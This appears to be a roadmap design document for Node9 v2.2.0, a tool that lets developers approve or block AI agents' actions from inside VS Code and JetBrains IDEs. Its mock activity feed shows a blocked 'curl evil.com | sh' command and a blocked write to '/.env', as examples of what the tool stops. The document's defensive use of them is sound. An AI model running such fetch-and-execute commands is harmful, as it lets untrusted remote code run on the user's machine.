# v2.2.0 — IDE Native Experience

> Theme: Node9 becomes a first-class citizen inside the IDE.
> No more browser popups. Approvals happen where the developer already is.
> Timeline: Future — only after v2.0.0 is stable

---

## Why This Comes Last

The VS Code Extension API changes frequently. Building a native extension too early means
constant maintenance chasing IDE API changes. The MCP Gateway (v1.2.0) already gives full
protection to any MCP-compatible IDE today. The extension is the _polish layer_ on top of
a solid foundation, not a workaround for missing capability.

---

## The 3-Tier IDE Architecture

```
Tier 1 (NOW — v1.2.0): Invisible
  ┌─────────────────────────────────────┐
  │  Cursor / Windsurf / Claude Desktop │
  │  uses MCP protocol                  │
  │  .mcp.json → node9 mcp-gateway      │
  └─────────────────────────────────────┘
  Protection: All named MCP tool calls
  Setup: node9 setup cursor (v1.4.0)
  UX: Desktop popup OR browser dashboard

Tier 2 (v1.3.0): Hook
  ┌─────────────────────────────────────┐
  │  IDE terminal / shell integration   │
  │  node9 addto cursor                 │
  └─────────────────────────────────────┘
  Protection: Raw shell commands the IDE runs
  Setup: node9 setup cursor --hook
  UX: Desktop popup OR browser dashboard

Tier 3 (v2.2.0): Visual (this file)
  ┌─────────────────────────────────────┐
  │  VS Code / Cursor native extension  │
  │  Sidebar + in-IDE notifications     │
  └─────────────────────────────────────┘
  Protection: Same as Tier 1+2, better UX
  Setup: Install from marketplace
  UX: In-IDE sidebar + notification toasts
```

## Feature 1: VS Code Extension

### Sidebar Activity Feed

Instead of `node9 tail` in a terminal, the developer sees a scrolling log of AI actions
in a dedicated sidebar panel.

```

────────────────────────────────

  14:32:04 ✅ write_file   /src/Button.tsx
  14:32:09 🔶 bash         rm -rf /tmp/build
           ↳ PENDING: waiting for approval
  14:32:11 ✅ bash         rm -rf /tmp/build  (approved)

RECENT BLOCKS
  14:28:15 🛑 write_file   /.env  (DLP: credential)
  14:25:03 🛑 bash         curl evil.com | sh

  ✅ postgres shield
  ✅ filesystem shield
  ⬜ github shield (click to enable)

```

### In-IDE Approval Notifications

Instead of a browser popup or desktop dialog, the approval request appears as a
VS Code notification toast at the bottom right:

```
┌──────────────────────────────────────────────┐
│ 🛡️ Node9: Approval Required                  │
│                                              │
│ bash: rm -rf /tmp/build                      │
│ Risk: low (sandbox path)                     │
│                                              │
│  [Allow]  [Block]  [Always Allow]  [Details] │
└──────────────────────────────────────────────┘
```

Clicking **Details** opens a panel showing:

- Full command / tool arguments
- Which rule triggered the review
- Risk metadata (DLP hits, provenance, etc.)

### Policy Manager Panel

A GUI for managing rules without touching JSON:

## Feature 2: JetBrains Plugin

Same capabilities as VS Code, implemented for IntelliJ IDEA, PyCharm, WebStorm.

JetBrains AI Assistant uses its own tool call protocol. The plugin registers as a
tool call interceptor in the IDE's extension API.

**Tool window:** Activity feed + approval buttons
**Notification:** IDE balloon notification for pending approvals
**Settings panel:** Shields + custom rules

---

## Feature 3: GitHub Copilot Integration

GitHub Copilot in VS Code uses a different protocol (language server + chat completions).
For Copilot workspace actions (file writes, terminal commands), the hook tier (v1.3.0)
provides protection automatically.

The v2.2.0 extension enhances this with:

- In-editor inline annotations showing which file writes were blocked/allowed
- Status bar item: `🛡️ Node9 active — 3 blocked today`

## Implementation Notes

### Extension Architecture

```
vscode-node9/
  src/
    extension.ts           activation, disposables
    sidebar/
      ActivityFeedProvider.ts   TreeDataProvider for live feed
      PolicyManagerProvider.ts  TreeDataProvider for shields/rules
    notifications/
      ApprovalHandler.ts        connects to daemon SSE, shows toasts
    daemon/
      DaemonClient.ts           HTTP + SSE client to localhost:7391
    views/
      RuleEditor.ts             webview panel for rule editing
  package.json              contributes: views, commands, configuration
  README.md
```

### Communication with node9 daemon

The extension connects to the running node9 daemon (same as the browser dashboard):

- SSE: `GET http://localhost:7391/events` for real-time feed
- REST: `POST http://localhost:7391/decision/:id` to approve/deny
- REST: `GET http://localhost:7391/suggestions` for rule suggestions

No new protocol — the extension is just another SSE client.

### Distribution

- VS Code Marketplace: `node9.node9-security`
- JetBrains Marketplace: `ai.node9.security`
- Both published automatically via CI on version tag

## Why NOT Build This First

| If we build the extension now...        | The risk                                |
| --------------------------------------- | --------------------------------------- |
| Cursor changes their MCP impl           | Extension breaks, users lose protection |
| VS Code updates extension API           | Extension broken in latest VS Code      |
| New IDE launches (Zed, etc.)            | Extension doesn't work there            |
| MCP gateway (Tier 1) → works everywhere | Extension is just a nice-to-have on top |

The MCP Gateway is the security foundation. The extension is the UX layer.
Build the foundation first.
